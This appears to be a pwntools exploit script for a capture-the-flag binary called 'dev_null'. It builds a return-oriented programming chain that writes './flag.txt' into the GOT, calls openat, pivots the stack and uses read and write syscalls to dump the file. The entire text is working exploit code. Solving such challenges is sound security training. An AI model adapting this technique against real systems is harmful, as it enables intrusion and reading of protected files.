from pwn import *

payload = b''

def write_what_where(what, where, ropchain):
	ropchain += pop_rsi_pop_rbp_ret
	ropchain += p64(where)
	ropchain += b'ABCDEFGH'
	ropchain += pop_rax_ret
	ropchain += what
	ropchain += write_rax_to_rsi_addr

	return ropchain

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])

if args.GDB:
	p = gdb.debug('./dev_null', gdbscript='b *dev_null+45\nc')
else:
	p = process('./dev_null')

# p = remote('383f7a42-9cd9-4e43-9ff0-960487c5e376.x3c.tf', 31337, ssl=True)

print(p.recvuntil(b'it.').decode())

xor_rax_rax_ret = p64(0x452df0)
pop_rax_ret = p64(0x42193c)
pop_rdi_ret = p64(0x413795)
pop_rsi_pop_rbp_ret = p64(0x402acc)
pop_rdx_leave_ret = p64(0x4650c3)
write_rax_to_rsi_addr = p64(0x420f45)
syscall_ret = p64(0x40bcd6)

got = 0x4ae000
pivot = got + 0x58

flag_first_part = p64(0x742e67616c662f2e)
flag_second_part = p64(0x007478)

payload += b'A' * 8
payload += b'B' * 8

# set rsi to ./flag.txt\0 ptr
payload = write_what_where(flag_second_part, got+0x8, payload)
payload = write_what_where(flag_first_part, got, payload)

# set rax = 0x101 for openat syscall
payload += pop_rax_ret
payload += p64(0x101)

# set rdi = Oxffffff9c (AT_FDCWD) to make openat use the cwd
payload += pop_rdi_ret
payload += p64(0xffffff9c)

# rdx already 0x0

payload += syscall_ret

######
# set up stack at GOT to pivot there to continue ropchain after leave instruction

# syscall to call read
payload = write_what_where(syscall_ret, pivot+0x8, payload)

# call write

# pop rdi ; ret
# set rdi = 1
payload = write_what_where(pop_rdi_ret, pivot+0x10, payload)
payload = write_what_where(p64(0x1), pivot+0x18, payload)

# pop rax ; ret
# set rax = 1
payload = write_what_where(pop_rax_ret, pivot+0x20, payload)
payload = write_what_where(p64(0x1), pivot+0x28, payload)

# put syscall ; ret
payload = write_what_where(syscall_ret, pivot+0x30, payload)
#####

# set up registers for read syscall and then pivot to GOT

# set rdi to 3 (new fd)
payload += pop_rdi_ret
payload += p64(0x3)

# set rsi to where to write to (GOT + 0x10)
# set rbp to stack addr pivot so ropchain continues after leave instruction
payload += pop_rsi_pop_rbp_ret		# pop rsi ; pop rbp ; ret
payload += p64(got + 0x10)              # rsi = GOT
payload += p64(pivot)			# rbp = addr of start of stack pivot addr

# set rax = 0
payload += xor_rax_rax_ret

# set rdx = 100
# then leave into pivot addr and conitnue from there
payload += pop_rdx_leave_ret
payload += p64(0x64)

p.sendline(payload)

p.interactive()
